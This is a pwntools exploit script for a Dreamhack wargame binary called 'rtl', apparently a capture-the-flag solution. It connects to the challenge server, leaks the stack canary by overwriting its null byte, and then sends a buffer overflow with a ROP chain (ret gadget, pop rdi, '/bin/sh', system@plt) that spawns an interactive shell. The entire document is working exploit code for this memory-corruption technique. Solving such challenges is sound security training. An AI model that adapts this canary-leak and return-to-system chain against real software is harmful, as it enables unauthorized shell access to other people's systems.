from pwn import *
# nc host2.dreamhack.games 17066
# p = process("./rtl")
p = remote("host2.dreamhack.games", 17066)

# context.log_level = "debug"

pr_gadget = 0x0000000000400853 # pop rdi ; ret
system_plt = 0x4005d0
bin_sh = 0x400874
 
# ret gadget --> reference : https://c0wb3ll.tistory.com/entry/ret2libc-x64
ret_gadget = 0x0000000000400285

p.recvuntil("Buf: ")

pay = b""
pay += b"A" * 0x39
p.send(pay)

p.recvuntil("A" * 0x38)
canary = u64(p.recv(8)) - ord('A')

print(hex(canary))

pay = b""
pay += b"A"*0x38
pay += p64(canary)
pay += b"X"*8
pay += p64(ret_gadget)
pay += p64(pr_gadget)
pay += p64(bin_sh)
pay += p64(system_plt)

p.sendafter("Buf: ", pay)

p.interactive()